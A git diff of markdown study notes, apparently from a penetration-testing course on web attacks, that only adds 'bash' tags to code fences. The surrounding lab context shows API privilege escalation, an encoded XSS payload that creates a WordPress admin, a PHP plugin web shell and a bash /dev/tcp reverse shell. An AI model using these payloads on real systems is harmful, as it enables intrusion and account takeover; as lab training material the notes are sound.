@@ -96,7 +96,7 @@ Module 8 becomes muscle memory when you keep this workflow handy—reach for it 
  - This is the common denominator of any web application that exposes its services.
 
 Since we found port 80 open on our target, we can proceed with service discovery. To get started, we'll rely on the nmap service scan `-sV` to grab the web server `-p80` banner.
-```
+```bash
 kali@kali:~$ sudo nmap -p80  -sV 192.168.50.20
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 05:13 EDT
 Nmap scan report for 192.168.50.20
@@ -109,7 +109,7 @@ Our scan shows that Apache version 2.4.41 is running on the Ubuntu host.
 
 - Take our enumeration further.
  - Use service-specific Nmap NSE scripts, like http-enum, which performs an initial fingerprinting of the web server.
-```
+```bash
 kali@kali:~$ sudo nmap -p80 --script=http-enum 192.168.50.20
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT
 Nmap scan report for 192.168.50.20
@@ -163,7 +163,7 @@ As shown above, we discovered several interesting folders that could lead to fur
   - Which enumerates files and directories.
 
 We need to specify the target IP using the -u parameter and a wordlist with -w. The default running threads are 10; we can reduce the amount of traffic by setting a lower number via the -t parameter.
-```
+```bash
 kali@kali:~$ gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
 ===============================================================
 Gobuster v3.1.0
@@ -240,7 +240,7 @@ Under the `/usr/share/wordlists/dirb/` folder we selected the `common.txt` wordl
  - Simplest to more complex web application attacks.
 
 Configure our local Kali's hosts file to statically assign the IP to the offsecwp website we are going to test.
-```
+```bash
 kali@kali:~$ cat /etc/hosts 
 
 ...
@@ -258,7 +258,7 @@ kali@kali:~$ cat /etc/hosts
   - Select the value of the pwd key and press the Add button on the right.
  - We have now instructed the Intruder to modify only the password value on each new request.
   - Provide Intruder with a wordlist. Knowing that the correct password is "password", we can grab the first 10 values from the rockyou wordlist on Kali.
-```
+```bash
 kali@kali:~$ cat /usr/share/wordlists/rockyou.txt | head
 123456
 12345
@@ -351,7 +351,7 @@ We can leverage several techniques to gather this information directly from the 
    - Sitemap files should not be overlooked because they may contain clues about the website layout or other interesting information, such as yet-unexplored portions of the target.
 
 **Example:**  we can retrieve the robots.txt file from www.google.com with curl:
-```
+```bash
 kali@kali:~$ curl https://www.google.com/robots.txt
 User-agent: *
 Disallow: /search
@@ -388,7 +388,7 @@ Brute forcing the API paths using a wordlist along with the pattern Gobuster fea
 we are using the "{GOBUSTER}" placeholder to match any word from our wordlist, which will be appended with the version number.
 
 Enumerate the API with gobuster using the following command:
-```
+```bash
 kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
 ===============================================================
 Gobuster v3.1.0
@@ -414,7 +414,7 @@ We discovered multiple hits, including two interesting entries that seem to be A
 - If we browse to the /ui path we'll discover the entire APIs' documentation. Although this is common during white-box testing, is not a luxury we normally have during a black-box test.
 
 inspect the /users API with curl.
-```
+```bash
 kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
 HTTP/1.0 200 OK
 Content-Type: application/json
@@ -442,7 +442,7 @@ Date: Wed, 06 Apr 2022 09:27:50 GMT
 The application returned three user accounts, including an administrative account that seems to be worth further investigation. We can use this information to attempt another brute force attack with gobuster, this time targeting the admin user with a smaller wordlist. 
 
 To verify if any further API property is related to the username property, we'll expand the API path by inserting the admin username at the very end.
-```
+```bash
 kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
 ===============================================================
 Gobuster v3.1.0
@@ -467,7 +467,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ```
 
 The password API path seems enticing for our testing purposes, so we'll probe it via curl.
-```
+```bash
 kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
 HTTP/1.0 405 METHOD NOT ALLOWED
 Content-Type: application/problem+json
@@ -487,7 +487,7 @@ Interestingly, instead of a 404 Not Found response code, we received a 405 METHO
 Both POST and PUT methods, if permitted on this specific API, could allow us to override the user credentials (in this case, the administrator password).
 
 Before attempting a different method, let's verify whether or not the overwritten credentials are accepted. We can check if the login method is supported by extending our base URL as follows:
-```
+```bash
 kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
 HTTP/1.0 404 NOT FOUND
 Content-Type: application/json
@@ -508,7 +508,7 @@ Date: Wed, 06 Apr 2022 12:04:30 GMT
 - Next, we will try to convert the above GET request into a POST and provide our payload in the required JSON format.
 - Craft request by first passing the admin username and dummy password as JSON data via the `-d` parameter.
  - Also specify "json" as the "Content-Type" by specifying a new header with `-H`.
-```
+```bash
 kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
 { "status": "fail", "message": "Password is not correct for the given username."}
 ```
@@ -516,7 +516,7 @@ kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: 
 
 - Try another route and check whether we can register as a new user.
  - Try registering a new user with the following syntax by adding a JSON data structure that specifies the desired username and password.
-```
+```bash
 kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
 
 { "status": "fail", "message": "'email' is a required property"}
@@ -525,7 +525,7 @@ kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Ty
 - API replied with a fail message stating that we should also include an email address.
  - Take this opportunity to determine if there's any **administrative key** we can abuse.
  - Add the admin key, followed by a `True` value.
-```
+```bash
 kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
 {"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
 ```
@@ -533,7 +533,7 @@ kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.c
 - We received no error, it seems we were able to successfully register a new user as an admin.
  - Should not be permitted by design.
 - Try to log in with the credentials we just created by invoking the login API we discovered earlier.
-```
+```bash
 kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
 {"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
 ```
@@ -542,7 +542,7 @@ kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: a
  - To obtain tangible proof that we are an administrative user.
  - We should use this token to change the admin user password.
 - We can attempt this by forging a POST request that targets the password API.
-```
+```bash
 kali@kali:~$ curl  \
   'http://192.168.50.16:5002/users/v1/admin/password' \
   -H 'Content-Type: application/json' \
@@ -560,7 +560,7 @@ kali@kali:~$ curl  \
 - Application states that the method used is incorrect.
  - We need to try another one.
 - PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request, so let's try to explicitly define it next.
-```
+```bash
 kali@kali:~$ curl -X 'PUT' \
   'http://192.168.50.16:5002/users/v1/admin/password' \
   -H 'Content-Type: application/json' \
@@ -571,7 +571,7 @@ kali@kali:~$ curl -X 'PUT' \
 - We received no error message.
  - We can assume that no error was thrown by the application backend logic.
 - To prove that our attack succeeded, try logging in as admin using the newly-changed password.
-```
+```bash
 kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
 {"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
 ```
@@ -683,7 +683,7 @@ Full workflow for exploiting vulnerable API.
 - Check for `'{"admin":"True"}'` if able to register.
 - Retrieve OAuth token, use for authenticated request.
  - Cause general chaos.
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://192.168.225.16:5002/users/v1/ -w /usr/share/wordlists/dirb/small.txt  
 ===============================================================
@@ -901,7 +901,7 @@ Date: Mon, 07 Aug 2023 02:26:15 GMT
 - Always check both.
 	- `robots.txt`
 	- `sitemap.xml`
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl -i http://192.168.225.52/robots.txt
 HTTP/1.0 200 OK
@@ -999,7 +999,7 @@ Server: Werkzeug/2.0.2 Python/3.9.9
 When you find strange strings in non-standard headers, decode:
 - `X-Something-Non-Standard: VGhlIGZsYWcgaXM6IE9TezNmMGE0YjdiNzc0NzNmZWIyNGJlZGMwMjY3YjNmMTRkfQ==`
 -  `echo "VGhlIGZsYWcgaXM6IE9TezNmMGE0YjdiNzc0NzNmZWIyNGJlZGMwMjY3YjNmMTRkfQ==" | base64 -d`
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl -i http://192.168.225.52            
 HTTP/1.0 200 OK
@@ -1285,7 +1285,7 @@ Let's run the function from the browser's console.  We decode with [fromCharCode
 **NOTE:** `eval()` AKA `evil` is responsible for interpreting string as code and executing it.
 
 The encoded string can be inserted into the following cURL command to launch the attack:
-```
+```bash
 kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
 ```
 We instructed curl to send a specially-crafted HTTP request with a User-Agent header containing our malicious payload, then forward it to our Burp instance so we can inspect it further.
@@ -1465,7 +1465,7 @@ function executeCommand(string $command) {
 ```
 
 Zip, upload, install, but do not "activate"
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nano plugin-shell.php
 
@@ -1507,7 +1507,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.178/443 0>&1'");
 ```
 
 Zip and upload:
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nano rev-shell.php   
                                                                              
@@ -1517,7 +1517,7 @@ Zip and upload:
 ```
 
 Activate and return shell on listener:
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvp 443        
 listening on [any] 443 ...
